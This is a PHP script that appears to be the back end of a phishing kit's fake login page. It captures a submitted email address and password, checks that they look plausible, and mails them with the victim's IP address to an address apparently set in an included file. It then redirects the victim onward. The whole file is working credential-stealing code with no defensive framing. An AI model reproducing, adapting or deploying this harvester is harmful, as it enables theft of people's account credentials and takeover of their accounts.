<?php

ini_set("output_buffering",4096);
session_start();


$_SESSION['errors2'] = $errors2=0;

$user = $_POST['login_email'];
$pass = $_POST['login_password'];

$pp = $_SESSION['pp'] = $pass;
$uu = $_SESSION['uu'] = $user;
$ip = $_SERVER['REMOTE_ADDR'];

$pasleg = strlen($pass);

function is_email($input) {
  $email_pattern = "/^([a-zA-Z0-9\-\_\.]{1,})+@+([a-zA-Z0-9\-\_\.]{1,})+\.+([a-z]{2,4})$/i";
  if(preg_match($email_pattern, $input)) return TRUE;

}
if(!is_email($user))
{
$userer=1;
}
else
{
$userer=0;
}

if ($pasleg>=8)
{
$passer=0;
}
else
{
$passer=1;
}

///
if ($userer==1||$passer==1)
{
$errors2=1;
}
else{
$errors2=0;
}

include 'Ooopz.php';

if ($errors2==0)
{
$data= "#################
E-mail : $user
Pass   : $pass
ip: $ip
#################";

$subject = "USER! $user - $pass";
mail($mailusers,$subject,$data);
header("Location: procesing.php");

}

else
{
header("Location: login.php?errors2=$errors2");
}
?>
